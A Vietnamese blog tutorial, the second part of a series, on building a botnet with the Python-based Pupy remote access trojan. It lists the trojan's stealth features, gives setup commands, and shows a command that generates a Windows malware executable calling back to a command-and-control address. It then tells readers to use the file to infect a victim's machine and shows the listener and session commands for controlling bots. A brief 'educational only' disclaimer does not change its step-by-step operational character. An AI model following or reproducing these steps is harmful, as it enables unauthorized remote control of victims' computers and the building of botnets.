## I. RAT là gì?
Các bạn có thể đọc phần 1 [tại đây](https://viblo.asia/p/rat-la-gi-huong-dan-xay-dung-he-thong-dieu-khien-nhieu-thiet-bibotnet-voi-rat-pupyphan-1-63vKjVwbK2R).

**Chú ý**:  Đây là bài viết mang tính chất học tập khuyến cáo mọi người không nên áp dụng vào thực tế.
## II.Hướng dẫn xây dựng mạng botnet với RAT pupy
### 1.     Pupy là gì?
&ensp; **Pupy** là một RAT đa nền tảng được xây dựng bằng python. Khi hoạt động pupy để lại rất ít dấu vết trên máy nạn nhân.  Pupy có thể giao tiếp với CnC bằng nhiều phương thức trao đổi giao tiếp khác nhau,  đi vào các tiến trình  bằng cách sử dụng reflective injection và tải mã python từ xa để thực thi.<br>
&ensp; Các tính năng cơ bản:
*  Với Windows payload có thể tải trình thông dịch python từ bộ nhớ với reflective DLL (nó không động chạm gì đến ổ cứng.)
* Pupy có thể được đóng gói thành một file.py duy nhất và có thể thực thi độc lập với hđh  chỉ yêu cầu các thư viện python chuẩn(PyCrypto có thể được thay thế bằng AES hoặc RSA nếu như PyCryoto không được kích hoạt trên victim).
* Reflectively migrate vào các tiến trình khác.
* Dễ dàng mở rộng, các modul đơn giản  và được sắp xếp theo OS và các thể loại.
* Tương tác từ xa từ pupy shell và tự động hoàn thành các thuộc tính từ xa.
* Có thể thực hiện lệnh trên nhiều victim cùng một lúc đó là cơ sở để có thể tạo thành mạng botbet.
* Thực thi PE file từ  xa hoặc từ bộ nhớ của victim.
<br>

&ensp; Pupy có thể generate file thực thi cho nhiều nền tảng:<br>
| Format  | Architecture | Short Name |
| -------- | -------- | -------- |
|Android Package|x86 & ARMv7|apk|
|Linux Binary|x86|lin_x86|
|Linux Binary|x64|lin_x64|
|Linux Shared Object|x86|so_x86|
|Linux Shared Object|x64|so_x64|
|Windows PE Executable|x86|exe_x86|
|Windows PE Executable|x64|exe_x64|
|Windows DLL|x86/x64|dll_x86/x64|
|Python Script|x86 & x64|py|
|PyInstaller|x86 & x64|pyinst|
|Python Oneliner|x86 & x64|py_oneliner|
|Powershell|x86 & x64|ps1|
|Powershell Oneliner|x86 & x64|ps1_oneliner|
|Ducky Script|N/A|rubber_ducky|

### 2. Các thư viện và công cụ cần dùng:
* mã nguồn pupy. link: https://github.com/n1nj4sec/pupy
* python 2.7 (cài đặt python 2.7 trên máy chủ C&C server.
* máy chủ linux (dùng làm C&C server) hoặc laptop cá nhân sử dụng Linux
* jdk, sdk cho việc generate file.apk
### 3.  Các bước thực hiện:
Download mã nguồn pupy:
```
git clone --recursive https://github.com/n1nj4sec/pupy
cd pupy
```
Sau đó, tạo môi trường làm việc với pupy:<br>
&ensp; Script *pupy/create-workspace.py* này sẽ tạo môi trường hoạt động cho pupy và tạo symlink tới pupysh ở *~./local/bin*.<br>
Nếu muốn tạo môi trường phiên bản nhẹ(không có các build toolchain):<br>

```python create-workspace.py -DG pupyw```

Tạo môi trường bản đầy đủ:

```python create-workspace.py pupyws```

![](https://images.viblo.asia/60bd9642-be84-4460-9dfe-9b9e6f1d1de6.png)

Sau khi cài đặt xong, tạo một symlink để gọi pupy từ terminal:
```
export PATH=$PATH:~/.local/bin; pupysh
pupyws/bin/pupysh
```
Sau khi thiết lập xong ta có thể chạy **pupy** từ terminal. Khởi chạy:

![](https://images.viblo.asia/f960c372-0d89-4b3c-b983-ff914db82b9f.png)

Tạo file thực thi client với modul ***gen*** trong pupy:

![](https://images.viblo.asia/65c7a626-b863-46da-9386-33752c8c972d.png)

Demo tạo client Windows 32bit với modul “gen”:
![](https://images.viblo.asia/e9c26563-8dfe-4bd6-a97d-477f8c50cde0.png)

```gen -f client -O windows -A x86 -o pupy_malware.exe  connect --host 172.16.216.1:9797 -t ssl```

Trong đó: 
* -f: định dạng của file 
* -O: hđh hoạt động
* -A: nền tảng(32bits/64bits)
* -o: ouput file name
* connect –host: địa chỉ máy chủ CnC server
* -t: kiểu giao tiếp(ssl, rsa, aes,..)

Sau khi thực thi xong lệnh trên ta sẽ nhận được 1 file .exe được lưu trong `pupyw/pupy_malware.exe`. Mang file này đi lây nhiễm và thực thi trên máy nạn nhân. Ta sẽ có được 1 bot.
<br>

Ta mở  port để lắng nghe kết nối từ client (bot):
```
listen -a <transport> <port> 
```
Trong đó:
* “transport” là phương thức transport đã thiết lập cho client  khi ta tạo client.
* "port" là cổng giao tiếp thiết lập ở phần generate client.

![](https://images.viblo.asia/cae1dc6f-d478-4eb0-8cac-34d7d08b16df.png)

Kiểm tra các kết nối đến **C&C server** `sessions`:

![](https://images.viblo.asia/26d94a80-d2df-4308-9f07-71d8e68fa66a.png)

Ở đây ta thấy có 1 client (bot) đang kết nối đến server. 
Kiểm tra các modul hỗ trợ cho clients `help -M`:

![](https://images.viblo.asia/8bcc9c7e-c5f8-4bc9-bd71-71284108d961.png)

Demo thực thi “command” hệ thống:

![](https://images.viblo.asia/ec79a9b1-b7a5-44e4-9e4f-71bd8fad3fbb.png)

Vậy là ta có thể điều khiển được máy nạn nhận.  Từ ví dụ trên ta có thể xây dựng được mạng botnet.

## III. Tài liệu tham khảo

* https://github.com/n1nj4sec/pupy/wiki